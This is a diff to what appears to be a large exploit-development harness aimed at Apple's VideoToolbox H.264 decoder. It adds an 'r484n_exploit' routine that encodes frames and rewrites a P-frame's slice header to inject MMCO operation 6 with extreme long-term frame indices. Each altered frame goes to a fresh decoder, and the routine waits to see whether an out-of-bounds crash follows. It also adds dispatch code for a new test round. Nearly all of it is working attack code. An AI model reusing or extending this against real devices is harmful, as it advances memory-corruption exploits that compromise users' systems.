@@ -22658,6 +22658,284 @@ r483_done:
     fflush(stdout);
 }
 
+/* ============================================================
+ * r484n: MMCO crash verification with fresh decoders + extreme indices
+ *
+ * Key question: does the decoder REACH MMCO processing before
+ * rejecting the macroblock data?
+ *
+ * Test: use extremely large long_term_frame_idx values (65535+)
+ * with a FRESH decoder per test. If OOB happens, large idx will
+ * crash. If no crash for idx=16777215, decoder never reaches MMCO.
+ * ============================================================ */
+
+static CMFormatDescriptionRef r484n_fmt = NULL;
+static uint8_t r484n_idr[65536];
+static size_t r484n_idr_len = 0;
+static uint8_t r484n_pframe[65536];
+static size_t r484n_pframe_len = 0;
+static int r484n_enc_n = 0;
+
+static void r484n_enc_cb(void *ref, void *src, OSStatus st,
+                         VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    r484n_enc_n++;
+    if (st != noErr || !sb) return;
+    CMFormatDescriptionRef f = CMSampleBufferGetFormatDescription(sb);
+    if (f && !r484n_fmt) { r484n_fmt = f; CFRetain(r484n_fmt); }
+    CMBlockBufferRef blk = CMSampleBufferGetDataBuffer(sb);
+    if (!blk) return;
+    size_t total = 0; char *data = NULL;
+    CMBlockBufferGetDataPointer(blk, 0, NULL, &total, &data);
+    if (!data || total == 0) return;
+    size_t off = 0;
+    while (off + 4 < total) {
+        uint32_t nlen = ((uint32_t)((uint8_t*)data)[off] << 24) |
+                        ((uint32_t)((uint8_t*)data)[off+1] << 16) |
+                        ((uint32_t)((uint8_t*)data)[off+2] << 8) |
+                        ((uint8_t*)data)[off+3];
+        uint8_t ntype = ((uint8_t*)data)[off+4] & 0x1F;
+        if (ntype == 5 && r484n_idr_len == 0) {
+            size_t cp = total; if (cp > sizeof(r484n_idr)) cp = sizeof(r484n_idr);
+            memcpy(r484n_idr, data, cp);
+            r484n_idr_len = cp;
+            return;
+        }
+        if (ntype == 1 && r484n_pframe_len == 0) {
+            size_t cp = 4 + nlen; if (cp > sizeof(r484n_pframe)) cp = sizeof(r484n_pframe);
+            memcpy(r484n_pframe, (uint8_t*)data + off, cp);
+            r484n_pframe_len = cp;
+            return;
+        }
+        if (ntype == 6) { off += 4 + nlen; continue; }
+        break;
+    }
+}
+
+static volatile int r484n_dec_st = 0;
+static void r484n_dec_cb(void *ref, void *src, OSStatus st,
+                         VTDecodeInfoFlags fl, CVImageBufferRef ib,
+                         CMTime pts, CMTime dur) {
+    r484n_dec_st = (int)st;
+    rlog("      dec_cb: st=%d ib=%p\n", (int)st, ib);
+}
+
+static void r484n_exploit(void) {
+    rlog("\n=== r484n: MMCO crash verify (fresh decoders, extreme idx) ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    r484n_fmt = NULL;
+    r484n_idr_len = 0;
+    r484n_pframe_len = 0;
+    r484n_enc_n = 0;
+
+    /* Step 1: Encode */
+    rlog("--- Step 1: Encode ---\n");
+    {
+        CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault, NULL, NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+        CFRelease(iop);
+        int pf = kCVPixelFormatType_32BGRA;
+        CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+        CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+        CFRelease(fn);
+
+        VTCompressionSessionRef enc = NULL;
+        VTCompressionSessionCreate(kCFAllocatorDefault, 128, 128, kCMVideoCodecType_H264,
+                                   NULL, sa, NULL, r484n_enc_cb, NULL, &enc);
+        CFRelease(sa);
+
+        if (enc) {
+            VTSessionSetProperty(enc, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+            VTSessionSetProperty(enc, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+            VTSessionSetProperty(enc, kVTCompressionPropertyKey_ProfileLevel,
+                                 kVTProfileLevel_H264_Baseline_3_0);
+            VTCompressionSessionPrepareToEncodeFrames(enc);
+            CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(enc);
+            for (int i = 0; i < 3; i++) {
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    memset(CVPixelBufferGetBaseAddress(pb), 0x40 + i * 0x20,
+                           CVPixelBufferGetBytesPerRow(pb) * CVPixelBufferGetHeight(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(i, 30),
+                        kCMTimeInvalid, NULL, NULL, NULL);
+                    CVPixelBufferRelease(pb);
+                }
+            }
+            VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+            VTCompressionSessionInvalidate(enc);
+            CFRelease(enc);
+        }
+    }
+    rlog("  IDR=%zu P=%zu\n", r484n_idr_len, r484n_pframe_len);
+
+    if (!r484n_fmt || r484n_idr_len == 0 || r484n_pframe_len == 0) {
+        rlog("  FAILED: missing data\n");
+        goto r484n_done;
+    }
+
+    /* Parse P-frame to find DRPM offset */
+    {
+        uint32_t nalu_len = ((uint32_t)r484n_pframe[0] << 24) |
+                            ((uint32_t)r484n_pframe[1] << 16) |
+                            ((uint32_t)r484n_pframe[2] << 8) |
+                            r484n_pframe[3];
+        uint8_t *nalu = r484n_pframe + 4;
+        uint8_t nal_ref_idc = (nalu[0] >> 5) & 3;
+
+        if (nal_ref_idc == 0) {
+            rlog("  nal_ref_idc=0, can't inject MMCO\n");
+            goto r484n_done;
+        }
+
+        r483_bitreader_t br;
+        r483_br_init(&br, nalu + 1, nalu_len - 1);
+
+        /* Parse: first_mb, slice_type, pps_id */
+        r483_br_read_ue(&br); r483_br_read_ue(&br); r483_br_read_ue(&br);
+        /* frame_num (5 bits), poc_lsb (6 bits) */
+        r483_br_read_bits(&br, 5); r483_br_read_bits(&br, 6);
+        /* ref_idx_override */
+        int ro = r483_br_read_bit(&br);
+        if (ro) r483_br_read_ue(&br);
+        /* ref_pic_list_mod */
+        int rlm = r483_br_read_bit(&br);
+        if (rlm) { uint32_t op; do { op = r483_br_read_ue(&br); if (op<3) r483_br_read_ue(&br); } while (op!=3); }
+
+        int drpm_offset = r483_br_bit_offset(&br);
+        int adaptive_flag = r483_br_read_bit(&br);
+        int after_drpm = r483_br_bit_offset(&br);
+
+        rlog("  drpm_offset=%d adaptive=%d after=%d\n", drpm_offset, adaptive_flag, after_drpm);
+
+        /* Test extreme indices with fresh decoder per test */
+        int test_idx[] = { 0, 255, 65535, 262143, 1048575, 4194303, 16777215 };
+        int ntest = sizeof(test_idx) / sizeof(test_idx[0]);
+
+        rlog("\n--- Step 2: Test extreme MMCO indices (fresh decoder each) ---\n");
+
+        for (int ti = 0; ti < ntest; ti++) {
+            int ltfi = test_idx[ti];
+            rlog("\n  [%d/%d] MMCO op 6 idx=%d:\n", ti+1, ntest, ltfi);
+            fflush(stdout);
+
+            /* Build modified NALU */
+            uint8_t mod_nalu[65536];
+            r482_bitwriter_t bw;
+            r482_bw_init(&bw, mod_nalu, sizeof(mod_nalu));
+            r482_bw_put_bits(&bw, nalu[0], 8);
+
+            r483_bitreader_t copy_br;
+            r483_br_init(&copy_br, nalu + 1, nalu_len - 1);
+            for (int b = 0; b < drpm_offset; b++)
+                r482_bw_put_bit(&bw, r483_br_read_bit(&copy_br));
+
+            r482_bw_put_bit(&bw, 1);       /* adaptive=1 */
+            r482_bw_put_ue(&bw, 6);        /* MMCO op 6 */
+            r482_bw_put_ue(&bw, (uint32_t)ltfi);
+            r482_bw_put_ue(&bw, 0);        /* MMCO end */
+
+            r483_bitreader_t tail_br;
+            r483_br_init(&tail_br, nalu + 1, nalu_len - 1);
+            for (int b = 0; b < after_drpm; b++) r483_br_read_bit(&tail_br);
+            int remaining = (int)(nalu_len - 1) * 8 - after_drpm;
+            for (int b = 0; b < remaining; b++)
+                r482_bw_put_bit(&bw, r483_br_read_bit(&tail_br));
+
+            int mod_len = r482_bw_finish(&bw);
+
+            uint8_t avcc[65536];
+            uint32_t avcc_nlen = (uint32_t)mod_len;
+            avcc[0] = (avcc_nlen >> 24) & 0xFF;
+            avcc[1] = (avcc_nlen >> 16) & 0xFF;
+            avcc[2] = (avcc_nlen >> 8) & 0xFF;
+            avcc[3] = avcc_nlen & 0xFF;
+            memcpy(avcc + 4, mod_nalu, mod_len);
+
+            rlog("    mod_len=%d\n", mod_len);
+
+            /* Create FRESH decoder */
+            VTDecompressionOutputCallbackRecord rec;
+            rec.decompressionOutputCallback = r484n_dec_cb;
+            rec.decompressionOutputRefCon = NULL;
+            VTDecompressionSessionRef dec = NULL;
+            VTDecompressionSessionCreate(kCFAllocatorDefault, r484n_fmt, NULL, NULL,
+                                         &rec, &dec);
+            if (!dec) { rlog("    FAILED to create decoder\n"); continue; }
+
+            /* Decode IDR first */
+            {
+                CMBlockBufferRef idr_blk = NULL;
+                CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault,
+                    r484n_idr, r484n_idr_len, kCFAllocatorNull, NULL,
+                    0, r484n_idr_len, 0, &idr_blk);
+                if (idr_blk) {
+                    CMSampleTimingInfo tm = {CMTimeMake(1,30), CMTimeMake(0,30), kCMTimeInvalid};
+                    size_t ss = r484n_idr_len;
+                    CMSampleBufferRef samp = NULL;
+                    CMSampleBufferCreateReady(kCFAllocatorDefault, idr_blk, r484n_fmt,
+                                              1, 1, &tm, 1, &ss, &samp);
+                    if (samp) {
+                        VTDecodeInfoFlags inf;
+                        VTDecompressionSessionDecodeFrame(dec, samp, 0, NULL, &inf);
+                        VTDecompressionSessionWaitForAsynchronousFrames(dec);
+                        CFRelease(samp);
+                    }
+                    CFRelease(idr_blk);
+                }
+            }
+            rlog("    IDR decoded\n");
+
+            /* Decode modified P-frame */
+            r484n_dec_st = 0;
+            {
+                CMBlockBufferRef blk = NULL;
+                CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault,
+                    avcc, 4 + mod_len, kCFAllocatorNull, NULL,
+                    0, 4 + mod_len, 0, &blk);
+                if (blk) {
+                    CMSampleTimingInfo tm = {CMTimeMake(1,30), CMTimeMake(1,30), kCMTimeInvalid};
+                    size_t ss = 4 + mod_len;
+                    CMSampleBufferRef samp = NULL;
+                    CMSampleBufferCreateReady(kCFAllocatorDefault, blk, r484n_fmt,
+                                              1, 1, &tm, 1, &ss, &samp);
+                    if (samp) {
+                        VTDecodeInfoFlags inf;
+                        rlog("    Decoding modified P...\n");
+                        fflush(stdout);
+                        OSStatus dst = VTDecompressionSessionDecodeFrame(dec, samp, 0, NULL, &inf);
+                        VTDecompressionSessionWaitForAsynchronousFrames(dec);
+                        rlog("    decode=%d cb_st=%d\n", (int)dst, r484n_dec_st);
+                        CFRelease(samp);
+                    }
+                    CFRelease(blk);
+                }
+            }
+
+            VTDecompressionSessionInvalidate(dec);
+            CFRelease(dec);
+
+            rlog("    Sleeping 2s for crash detection...\n");
+            fflush(stdout);
+            sleep(2);
+            rlog("    Still alive.\n");
+            fflush(stdout);
+        }
+    }
+
+r484n_done:
+    if (r484n_fmt) { CFRelease(r484n_fmt); r484n_fmt = NULL; }
+    rlog("\n=== r484n complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -92735,6 +93013,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 488) {
+            rlog("*** rounds=488: MMCO crash verify (fresh decoders, extreme idx) ***\n\n");
+            fflush(stdout);
+            r484n_exploit();
+            goto done;
+        }
         if (rounds == 487) {
             rlog("*** rounds=487: Modified P-frame MMCO injection ***\n\n");
             fflush(stdout);
@@ -95666,7 +95950,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
